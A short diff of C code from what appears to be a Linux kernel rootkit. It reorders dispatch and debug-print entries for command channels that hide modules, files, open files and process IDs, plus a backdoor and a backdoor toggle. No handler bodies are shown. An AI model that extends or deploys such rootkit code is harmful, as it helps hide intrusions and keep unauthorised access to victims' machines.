@@ -27,9 +27,9 @@ report_channels(void)
     DEBUG_NOTICE("%-24s %#10lx\n", "MODHIDE",  G7_MODHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "FILEHIDE", G7_FILEHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "OPENHIDE", G7_OPENHIDE);
+    DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_PIDHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "BACKDOOR", G7_BACKDOOR);
     DEBUG_NOTICE("%-24s %#10lx\n", "TOGGLEBD", G7_TOGGLEBD);
-    DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_PIDHIDE);
     DEBUG_NOTICE("-----------------------------------\n");
 }
 
@@ -41,9 +41,9 @@ detect_channel(unsigned cmd)
     case G7_MODHIDE:  return (channel_t){ "MODHIDE",  handle_modhide  };
     case G7_FILEHIDE: return (channel_t){ "FILEHIDE", handle_filehide };
     case G7_OPENHIDE: return (channel_t){ "OPENHIDE", handle_openhide };
+    case G7_PIDHIDE:  return (channel_t){ "HIDEPID",  handle_pidhide  };
     case G7_BACKDOOR: return (channel_t){ "BACKDOOR", handle_backdoor };
     case G7_TOGGLEBD: return (channel_t){ "TOGGLEBD", handle_togglebd };
-    case G7_PIDHIDE:  return (channel_t){ "HIDEPID",  handle_pidhide  };
     }
 
     return (channel_t){ "unknown", NULL };
